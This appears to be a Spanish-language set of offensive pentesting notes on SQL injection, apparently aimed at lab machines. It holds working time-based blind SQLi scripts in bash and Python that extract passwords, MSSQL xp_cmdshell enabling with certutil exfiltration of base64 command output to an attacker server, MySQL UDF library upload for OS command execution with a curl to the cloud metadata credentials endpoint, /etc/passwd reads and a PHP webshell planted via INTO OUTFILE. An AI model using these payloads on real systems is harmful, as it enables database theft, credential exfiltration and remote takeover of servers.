if [[ "whiteresult" -ge "2" ]]
then
echo -e "[${yellow}¡${def}] Segundo ID en blanco"
echo -e "[${green}*${def}] Fin de enumeración del campo $fieldname en la tabla $tablename"
tput cnorm
exit 0
fi
echo -e "${white}Enumerando ID ${cian}$t${white} del campo $fieldname${def}\n"
for (( i=1; i <= $charlimit; i++))
do
if [[ "whitechar" -ge "2" ]]
then
echo -e "  \e[1A\e[K[${grey}-${def}] Segundo caracter en blanco"
echo -e "  Fin de la enumeración del ID $t del campo $fieldname\n"
echo -e "  ${white}Valor del campo $fieldname para ID $t: ${green}$result${def}\n\n"
chrlen=${#result}
if [[ "$chrlen" -le 1 ]]
then
whiteresult=$((whiteresult + 1))
fi
break
fi

# bucle anidado que recorre cada uno de los caracteres almacenados en la variable char
for (( k=0; k<${#char}; k++ ))
do
echo -e "  \e[1A\e[KProbando caracter ${char:$k:1} en posición $i: $result""_"

SECONDS=0
curl -X POST "http://$host/zm/index.php" \
-d "view=request&request=log&task=query&limit=100;( SELECT * FROM ( SELECT( if( \
substr((select $fieldname from $tablename where id=$t),$i,1)='${char:$k:1}',sleep(5),1 \
) ) )OQkj)#minTime=1'" &>/dev/null

DURATION=$SECONDS

# verificación del si la diferencia entre el tiempo inicial y el final es mayor de 5 segundos
if [[ "$DURATION" -ge "4" ]]
then
result+=${char:$k:1}
if [[ "$i" -ge 1 ]]
then
if [[ "$whitechar" -eq 1 ]] # corrección de escritura si el primer caracter estaba en blanco pero los demás no
then
echo -e "  \e[1A\e[KCaracteres encontrados: $result\n"
whitechar=0
break
else
echo -e "  \e[2A\e[KCaracteres encontrados: $result\n"
whitechar=0
break
fi
else
echo -e "  \e[1A\e[KCaracteres encontrados: $result\n"
break
fi
else
if [[ "${char:$k:1}" = "z" ]]
then
whitechar=$((whitechar+1))
fi
fi
done
done
if [[ "whitechar" -ge "2" ]]
then
whitechar=0
result=""
else
echo -e "  Se ha alcanzado el límite de $charlimit caracteres por campo."
echo -e "\n  ${yellow}Valor del campo $fieldname para ID $t: ${green}$result${def}\n\n"
whitechar=0
result=""
fi
done
echo -e "[${green}*${def}] Fin de enumeración del campo $fieldname en la tabla $tablename"
tput cnorm
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Señalar que en este caso se pone la sentencia entre paréntesis, para que no de errores en la ejecución.
Se añade un contador de espacios en blanco (para aligerar la búsqueda).
En el primer caracter que no encuentre coincidencia continuará, para permitir nombres compuestos, con dos o más palabras
La segunda vez, consecutiva, que no encuentra coincidencia, entiende que son 2 espacios en blanco seguidos y entiende que ha finalizado la búsqueda.


Averiguar Valor de Campo Conocido de Usuario Conocido en Columna Conocida de Tabla Conocida
La consulta sería: substr((select password from users where username='admin'),%d,1)='%c',sleep(5),1)-- -
Donde:
columnaPassword → es el nombre de la columna que contiene las passwords
tablaUsers → es el nombre de la tabla que contiene la columna con las passwords
usuarioConocido → es el nombre del usuario que se conoce, del cual se quiere obtener la password
%d → será la posición del caracter que se está comprobando
%c → será la posición en el array de caracteres a probar del caracter que se comprueba
5 → será el número de segundos de espera antes de proseguir con la ejecución (si lo espera es que coincide)
sqli_pwner.py

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests, time, sys, signal
from pwn import *

# variable para almacenar el tiempo de espera de las consultas
sleep = 0

# establece el timpo de espera para validar consulta en 5 si no se ha pasado argumento o en el valor que se haya pasado como argumento
if len(sys.argv) == 1:
sleep = 5
else:
sleep = int(sys.argv[1])

def def_handler(sig, frame):
log.failure("Saliendo")
sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
url = 'http://admin.cronos.htb/index.php'
burp = {'http': 'http://127.0.0.1:8080'}
s = r'abcdefghijklmnopqrstuvwxyz0123456789.:*@#$%^&-_=()!¡\/{}[]'
result = ''

def check(payload):
data_post = {
'username': '%s' % payload,
'password': 'test'
}
time_start = time.time()
content = requests.post(url, data=data_post)
time_end = time.time()
if time_end - time_start > sleep:
return 1

p1 = log.progress("Password")
p2 = log.progress("Payload")

# variable para controlar los espacios en blanco
cont = 0

for i in xrange(1, 40):
# Si ha sumado mas de 2 veces sin encontrar un caracter, se entiende que son caracteres en blanco, se da por finalizada la búsqueda para esa columna
if ( cont > 2 ):
print("[!] tres caracters en blanco seguidos. Pasamos a la siguiente iteración")
break

for c in s:
payload = "' or if(substr((select password from users where username='admin'),%d,1)='%c',sleep(%d),1)-- -" % (i,c,sleep)
p2.status("%s" % payload)

if check(payload):
result += c
p1.status("%s" % result)
# si ha encontrado una coincidencia resetea el contador de caracteres en blanco para permitir espacios entre las palabras que formen el nombre
cont = 0
break

# si ha llegado a recorrer todos los caracteres significa que no ha encontrado ninguna coincidencia, se suma 1 a caracteres en blanco
cont = cont + 1

p1.success("%s" % result)
result = ''
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


sqli_db_field_value.sh <tabla> <campo_conocido> <valor_campo_conocido> <campo_del_que_obtener_el_valor> [longitud_máxima_del_campo]

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/bin/bash

# DEFINICION DE COLORES PARA USAR EN SCRIPTS DE BASH
def='\e[39m'
red='\e[38;5;196m'
green='\e[38;5;46m'
yellow='\e[38;5;11m'
blue='\e[38;5;21m'
pink='\e[38;5;13m'
cian='\e[38;5;87m'
white='\e[38;5;15m'
grey='\e[38;5;240m'

# CAPTURAR Ctrl+C
trap ctrl_c INT


function ctrl_c(){
echo -e "\n[${yellow}!${def}] Detectado Ctrl+C"
echo -e "[${red}*${def}] Finalizando la ejecución..."
tput cnorm
exit 0
}

function usage(){
echo -e "\n${white}[${red}!${white}]${def} Se ha producido uno de los siguientes ERRORES:"
echo -e "\t- No se ha proporcionado el nombre de la tabla (como argumento 1)"
echo -e "\t- No se ha proporcionado el nombre del campo a usar como referencia (como argumento 2)"
echo -e "\t- No se ha proporcionado el valor que debe contener el campo de referencia (como argumento 3)"
echo -e "\t- No se ha proporcionado el nombre del campo del que se desea obtener el valor (como argumento 4)"
echo -e "\t- Se han proporcionado más argumentos de los esperados (máximo 5)\n"
echo -e "${white}[${def}-${white}]${def} USO:\n\t${white}$0 ${yellow} <nombre_de_tabla> <campo_de_referencia> <valor_del_campo_de_referencia> <campo_del_que_obtener_el_valor> ${grey}[longitud_del_campo]${def}"
echo -e "\t${grey}$0 Users username admin password 40${def}"
echo -e "\n\n${white}[${yellow}!${white}]${def} RECUERDA:\n\tLos ${white}nombres${def} de las ${white}tablas${def} son ${white}CASE SENSITIVE${def}"
echo -e "\tProbar con la primera letra en mayúscula y el resto en minúscula"
exit 0
}

if [[ "$#" -lt "4" ]]
then
usage
fi

if [[ "$#" -gt "5" ]]
then
usage
fi

tput civis

tablename=$1    # pasar el nombre de la tabla a enumerar como argumento 1
fieldname=$2    # pasar el nombre del campo que es usará como referencia como argumento 2
fielvalue=$3    # pasar el valor que debe contener el campo de referencia como argumento 3
field=$4        # pasar el nombre del campo del cual se quiere obtener el valor 4
charlimit=100

# ADAPTAR ESTOS VALORES
host='192.168.102.52'

# corrección del límite de caracteres en función de si se ha proporcionado uno como argumento 5
if [[ "$#" -eq "5" ]]
then
charlimit=$5
fi

# variable que almacena los caracteres que se probaran
char='0123456789abcdefghijklmnopqrstuvwxyz.:*@#$%^&-_=()!¡\/{}[]'

# variable para almacenar los resultados
result=""
whitechar=0

echo -e "\n${white}[${green}*${white}] --- Enumerando valor del campo \"${yellow}$field${white}\" de la tabla \"${yellow}$tablename${white}\" en base al valor \"${yellow}$fielvalue${white}\" del campo \"${yellow}$fieldname${white}\" de la misma tabla --- [${green}*${white}]${def}\n"

for (( i=1; i <= $charlimit; i++))
do
if [[ "whitechar" -ge "2" ]]
then
echo -e "  \e[1A\e[K[${grey}-${def}] Segundo caracter en blanco"
break
fi

# bucle anidado que recorre cada uno de los caracteres almacenados en la variable char
for (( k=0; k<${#char}; k++ ))
do
echo -e "  \e[1A\e[KProbando caracter ${char:$k:1} en posición $i: $result""_"

SECONDS=0
curl -X POST "http://$host/zm/index.php" \
-d "view=request&request=log&task=query&limit=100;( SELECT * FROM ( \
SELECT( \
if( 
substr( \
(select $field from $tablename where $fieldname='$fielvalue'),$i,1)='${char:$k:1}', sleep(5), 1 \
) \
) \
)OQkj)#minTime=1'" &>/dev/null

DURATION=$SECONDS

# verificación del si la diferencia entre el tiempo inicial y el final es mayor de 5 segundos
if [[ "$DURATION" -ge "4" ]]
then
result+=${char:$k:1}
if [[ "$i" -ge 1 ]]
then
if [[ "$whitechar" -eq 1 ]] # corrección de escritura si el primer caracter estaba en blanco pero los demás no
then
echo -e "  \e[1A\e[KCaracteres encontrados: $result\n"
whitechar=0
break
else
echo -e "  \e[2A\e[KCaracteres encontrados: $result\n"
whitechar=0
break
fi
else
echo -e "  \e[1A\e[KCaracteres encontrados: $result\n"
break
fi
else
if [[ "${char:$k:1}" = "z" ]]
then
whitechar=$((whitechar+1))
fi
fi
done
done

echo -e "  ${white}Valor del campo $field para el valor $fielvalue del campo $fieldname en la tabla $tablename: ${green}$result${def}\n"
echo -e "  Fin de la enumeración."
tput cnorm
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Señalar que en este caso se pone la sentencia entre paréntesis, para que no de errores en la ejecución.
Se introduce condicional para aceptar como argumento un valor para el tiempo del sleep
Se añade un contador de espacios en blanco (para aligerar la búsqueda).
En el primer caracter que no encuentre coincidencia continuará, para permitir nombres compuestos, con dos o más palabras
La segunda vez, consecutiva, que no encuentra coincidencia, entiende que son 2 espacios en blanco seguidos y entiende que ha finalizado la búsqueda.


Ejecución Remota de Comandos (RCE) con SQLI

XP_CMDSHELL
En MSSQL existe el proceso llamado xp_cmdshell. Este proceso recibe un comando de windows, lo ejecuta  y devuelve el resultado como lineas de texto.
Por defecto está deshabilitado.

Habilitar xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

ACE con xp_cmdshell
Para verificar si tenemos capacidad para ejecutar comandos vía xp_cmdshell utilizamos "certutil". Este comando realizará una petición 'GET' a la $ip indicada

';EXEC xp_cmdshell 'certutil -urlcache -f http://$ip';--
Donde:				
"';" y ";--"	→ forman parte de la petición que permite la SQLi
$ip 				→ es la ip de la máquina atacante donde un servidor HTTP estará esperando la petición, si la recibe es que tenemos capacidad de ejecución

RCE con xp_cmdshell
Con xp_cmdshell, dado que la inyección no ocurre en la consulta origina no podremos ver la salida del comando.
Si tenemos capacidad de ejecutar "certutil" podemos exfiltrar datos utilizando este comando para enviar peticiones GET a nuestro servido r que contengan estos datos.
Los datos son codificados en Base64 ya que permite transferir más información en menos caracteres.

Proceso
1.- Declarar una variable de tipo "table" para almacenar la salida de los comandos ejecutados mediante el proceso xp_cmdshell
declare @r varchar(4120),@cmdOutput varchar(4120);
declare @res TABLE(line varchar(max));
2.- Dumpear la salida de los comandos ejecutados a la variable
insert into @res exec xp_cmdshell 'COMMAND';
3.- Concatenar las filas de la tabla separándolas con "line break"
Si no disponemos de la función group_concat, podemos utilizar 'FOR XML' para concatenar las filas en una sola cadena en formato XML
Utilizamos una cadena vacía como 'PATH mode' para eliminar las etiquetas
SELECT column+char(10) as 'text()' FROM table FOR XML path('')
4.- Codificar en Base64 la cadena resultante y almacenarla en una variable
Como no se puede convertir directamente un string en Base64, la solución es convertir previamente la string a datos de tipo binario
SELECT cast('tarlogic' AS varbinary(max)) FOR XML path(''), BINARY BASE64
5.- Utilizar el comando "certutil" para realizar la petición 'GET' añadiéndole la información contenida en la variable.

Ejemplo
declare @r varchar(4120),@cmdOutput varchar(4120);
declare @res TABLE(line varchar(max));
insert into @res exec xp_cmdshell 'COMMAND';
set @cmdOutput=(select (select cast((select line+char(10) COLLATE SQL_Latin1_General_CP1253_CI_AI as 'text()' from @res for xml path('')) as varbinary(max))) for xml path(''),binary base64);
set @r=concat('certutil -urlcache -f https://redteam/',@cmdOutput);
exec xp_cmdshell @r;

Automatización
Una vez que tenemos la capacidad de ejecutar y visualizar la salida de cualquier comando, procedemos a automatizar el proceso.
El siguiente enlace dispone de una herramienta que ofrece al usuario un mensaje para ingresar un comando.
Luego, genera la carga útil necesaria para ejecutarlo mientras se implementa un servidor web para recibir el resultado. Finalmente, lo decodifica y lo muestra en pantalla.


RCE en MySQL vía UDF (Funciones Definidas Por el Usuario) 

Recursos
https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
https://book.hacktricks.xyz/pentesting-web/sql-injection/mysql-injection/mysql-ssrf
https://osandamalith.com/2018/02/11/mysql-udf-exploitation/
https://dev.mysql.com/doc/refman/5.7/en/create-table.html
https://www.tutorialspoint.com/mysql/mysql-create-tables.htm

Descripción
Consiste en cargar una librería personalizada (con funciones personalizadas) en una tabla de la base de datos, para posteriormente volcarla a la ruta de las librerías para MySQL.
Finálmente se podrán realizar llamadas a las funciones definidas en la librería personalizada mediante la capacidad de SQLi que se tenga.

Según la versión de MySQL (identificar con 'SELECT @@version) el directorio desde donde se pueden cargar los complementos está restringido.
MySQL por debajo de v5.0.67 permite que los archivos de la biblioteca se carguen desde la ruta del sistema, si no se estableció la variable plugin_dir.
Las versiones más nuevas tienen la variable plugin_dir configurada en algo como "/usr/lib/mysql/plugin/", que generalmente es propiedad de root (consultar con 'SELECT @@plugin_dir').

Requisitos
- Que la SQLi la ejecute un usuario con capacidad de INSERT en el la BBDD 'mysql'
- Que la SQLi la ejecute un usuario con capacidad de acceso remoto desde cualquier host
- Capacidad de escribir en la ubicación especificada en @@plugin_dir mediante la SQLi
- file_priv establecido en Y en mysql.user para el usuario de la base de datos
- secure_file_priv establecido en "" para leer los bytes sin procesar desde una ubicación arbitraria, como la red o un directorio de carga de archivos en una aplicación web.

Si se cumplen las condiciones anteriores, puede transferir la biblioteca MySQL UDF lib_mysqludf_sys al servidor de la base de datos.
Luego podrá realizar solicitudes de comandos del sistema operativo como curl o powershell wget para realizar SSRF usando la sintaxis:
x'; SELECT sys_eval('curl http://169.254.169.254/latest/meta-data/iam/security-credentials/'); -- //

Funciones
sys_exec
sys_eval
http_get

Ejemplo
# curl -X POST "http://$ip/zm/index.php" -d "view=request&request=log&task=query&limit=100;( SELECT * FROM (SELECT(sys_exec('ping -c 2 192.168.49.102')))OQkj)#minTime=1'"


Proceso Completo

1.- Seleccionamos la librería adecuada según el OS y la arquitectura de la máquina víctima:
# ls /usr/share/metasploit-framework/data/exploits/mysql/
lib_mysqludf_sys_32.dll		lib_mysqludf_sys_32.so		lib_mysqludf_sys_64.dll		lib_mysqludf_sys_64.so

2.- Convertimos la librería seleccionada en una Cadena Hexadecimal:
# xxd -p libSelec.ext | tr -d '\n' > libSelecHex.txt

3.- Partimos la cadena hexadecimal en archivos de 256 bytes (esto generara archivo con nombre xaa, xab, xac, ..., xnn de 256 bytes)
# split -b 256 libSelecHex.txt

4.- Para facilitar el proceso siguiente:
a) guardamos el nombre de los archivos creados en una lista:
# ls x* > partes_cadena_hex.txt
b) eliminamos del archivo la primera línea (ya que esa se inserta la primera, por separado del resto):
# sed -i -e "1d" partes_cadena_hex.txt
b) cambiamos el nombre del primer archivo (para facilitar luego el proceso de inserción):
# mv xaa aaa

!!!→	Los siguientes comandos se han de ejecutar como PAYLOAD de la capacidad de SQLi que tengamos.
Para facilitarlo, creamos un script que utiliza el argumento que le pasemos de entrada como PAYLOAD de la request con la que tenemos capacidad de SQLi

5.- Creamos tabla nueva:
# ./script.sh "CREATE TABLE nombreTabla(nombreColumna longblob)"

6.- Insertamos la primera parte de la cadena hexadecimal en la columna creada:
# ./script.sh "INSERT INTO nombreTabla(nombreColumna) VALUES (0x$(cat aaa))"

7.- Concatenamos el resto de partes de la cadena hexadecimal con el valor almacenado en la columna creada
# for file in $(cat partes_cadena_hex.txt); do ./script.sh "UPDATE nombreTabla SET nombreColumna=CONCAT(data,0x$(cat $file))"; done

8.- Volcamos el contenido de la columna creada dentro de un archivo, con extensión adecuada al OS de la vícitma (.dll || .so), en la carpeta de plugins
# ./script.sh "SELECT nombreColumna FROM nombreTabla INTO DUMPFILE '/usr/lib/mysql/plugin/customlib.so'"

9.- Creamos las funciones para ejecución de comandos y para evaluación de comandos:
# ./script.sh "CREATE FUNCTION sys_exec RETURNS int SONAME 'customlib.so'"
# ./script.sh "CREATE FUNCTION sys_eval RETURNS string SONAME 'customlib.so'"

10.- Ejecutamos un ping contra nuestra máquina para verificar que funciona:
# ./script.sh "SELECT sys_exec('ping -c2 $host')"


Puerta Trasera en Servidor Web con SQLi (Inyección SQL)

Petición Legitima SQL utilizada en los ejemplos
select user, password from user where user="admin" and password='123'


Escribir Archivos Arbitrarios
Comando MySQL
mysql> select "text" INTO OUTFILE "file.txt"

Anexado a la Petición Legítima con UNION SQL
select user, password from user where user="admin" and password="123" UNION select "text",2 into outfile "/tmp/file.txt" -- '

Resultado
Se creará el archivo "/tmp/file.txt" incluido el resultado de la consulta


Leer Archivos Arbitrarios
Comando MySQL
mysql> select load_file("PATH_TO_FILE");

Anexado a la Petición Legítima con UNION SQL
select user, password from user where user="admin" and password="123" UNION select load_file("/etc/passwd"), 2-- '


Webshell
Código Simple Webshell
<? system($_REQUEST['cmd']); ?>

Escenario
Ruta con permiso de escritura utilizado en los ejemplos: /var/www/html/temp

Ejecución
1. Encontrar una Inyección SQL (SQLi)
2. Localizar un directorio con permisos de escritura
Opción A:
Directorios temporales utilizados por los CMS. Verificar estas URLs para encontrar uno
• hxxp://www.target.com/templates_compiled/
• hxxp://www.target.com/templates_c/
• hxxp://www.target.com/templates/
• hxxp://www.target.com/temporary/
• hxxp://www.target.com/images/
• hxxp://www.target.com/cache/
• hxxp://www.target.com/temp/
• hxxp://www.target.com/files/
Opción B:
Generar Errores PHP
Causar un fallo de un script php, esto imprimirá la ruta completa junto con el mensaje de error.
Jugar con los parámetros de la página puede hacer que esto suceda.
Buscar archivo que Imprima phpinfo()
Por ejemplo:
◇ hxxp://www.target.com/phpinfo.php
◇ hxxp://www.target.com/test.php
◇ hxxp://www.target.com/info.php
Buscar Ubicación Predeterminada del directorio Web
https://web.archive.org/web/20131205065157/http://wiki.apache.org/httpd/DistrosDefaultLayout	
Leer el Archivo de Configuración de Apache
Usar el comando load_file() para leer el archivo apache2.conf
select user, password from user where user="admin123" and password="123&" UNION select load_file("/etc/apache2/apache2.conf"), 2 -- '

3. Utilizar la SLQi para Crear la Webshell
Agregar la siguiente cadena al comando SQL legítimo:

!!!*** Verifica el número de columnas de esa query (con ' order by 100-- -) para adaptar el valor de ,2,3,4 o eliminarlos si solo es 1
' UNION SELECT ("<?php system($_REQUEST['cmd']); ?>"),2,3,4 INTO OUTFILE '/var/www/html/temp/c.php' -- 1
Donde:
2,3,4 				← Para que la petición tenga el mismo número de columnas que la primera parte de la Petición Legítimo (en este caso se añaden 3 columnas).
/var/www/html	← Directorio Web por defecto de la distribuciones tipo RedHat-like (Fedora, CentOS).
temp 				← Directorio con permisos de escritura.

4. Ejecución de Comandos Shell
Petición tipo: 	hxxp://www.target.com/temp/c.php?cmd=SHELL_COMMAND
Ejemplo:			hxxp://www.target.com/temp/c.php?cmd=id

Volver a Inicio → 